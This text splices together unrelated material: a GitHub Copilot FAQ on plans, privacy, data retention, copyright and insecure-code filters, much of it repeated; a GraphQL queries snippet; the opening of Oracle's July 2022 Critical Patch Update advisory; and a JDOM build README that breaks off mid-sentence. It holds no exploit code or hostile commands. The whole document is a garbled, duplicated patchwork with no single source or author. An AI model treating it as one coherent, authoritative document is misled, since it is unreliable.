Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.

## [About queries](#about-queries)

Every GraphQL schema has a root type for both queries and mutations. The [query type](https://spec.graphql.org/June2018/#sec-Type-System) defines GraphQL operations that retrieve data from the server.

For more information, see [Forming calls with GraphQL](/en/graphql/guides/forming-calls-with-graphql#about-queries).

Note

For GitHub App requests made with user access tokens, you should use separate queries for issues and pull requests. For example, use the `is:issue` or `is:pull-request` filters and their equivalents. Using the `search` connection to return a combination of issues and pull requests in a single query will result in an empty set of nodes.

## Oracle Critical Patch Update Advisory - July 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 349 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [July 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2880220.1).

**Please note that since the release of the April 2022 Critical Patch Update, Oracle has released a Security Alert for Oracle E-Business Suite [CVE-2022-21500 (May 19, 2022)](https://www.oracle.com/security-alerts/alert-cve-2022-21500.html). Customers are strongly advised to apply the July 2022 Critical Patch Update for Oracle E-Business Suite, which includes patches for this Alert as well as additional patches.**

#### Note:

* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujul2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

# Introduction to the JDOM project

Please see the JDOM web site at <http://jdom.org/>
and GitHub repository at <https://github.com/hunterhacker/jdom/>

# Quick-Start for JDOM

See the github wiki for a Primer on using JDOM:

<https://github.com/hunterhacker/jdom/wiki/JDOM2-A-Primer>

Also see the web site <http://jdom.org/downloads/docs.html>. It has links to
numerous articles and books covering JDOM.

# Installing the build tools

The JDOM build system is based on Apache Ant. Ant is a little but very
handy tool that uses a build file written in XML (build.xml) as building
instructions. For more information refer to "<http://ant.apache.org>".

The only thing that you have to make sure of is that the "JAVA\_HOME"
environment property is set to match the top level directory containing the
JVM you want to use. For example:

```
C:\> set JAVA_HOME=C:\jdk1.6

```

or on Mac:

```
% setenv JAVA_HOME /System/Library/Frameworks/JavaVM.framework/Versions/CurrentJDK/Home
  (csh)
> JAVA_HOME=/System/Library/Frameworks/JavaVM.framework/Versions/CurrentJDK/Home; export JAVA_HOME
  (ksh, bash)

```

or on Unix:

```
% setenv JAVA_HOME /usr/local/java
  (csh)
> JAVA_HOME=/usr/java; export JAVA_HOME
  (ksh, bash)

```

That's it!

# Building instructions

If you do not have the full source code it can be cloned from GitHub. The JDOM
project at <https://github.com/hunterhacker/jdom> has the instructions and source
URL to make the git clone easy.

You will need to have Apache Ant 1.8.2 or later, and you will need Java JDK 1.6
or later.

Ok, let's build the code. First, make sure your current working directory is
where the build.xml file is located. Then run "ant".

If everything is right and all the required packages are visible, this action
will generate a file called "jdom-2.x-20yy.mm.dd.HH.MM.zip" in the
"./build/package" directory. This is the same 'zip' file that is distributed
as the official JDOM distribution.

The name of the zip file (and the jar names inside the zip) is controlled by
the two ant properties 'name' and 'version'. The package is called
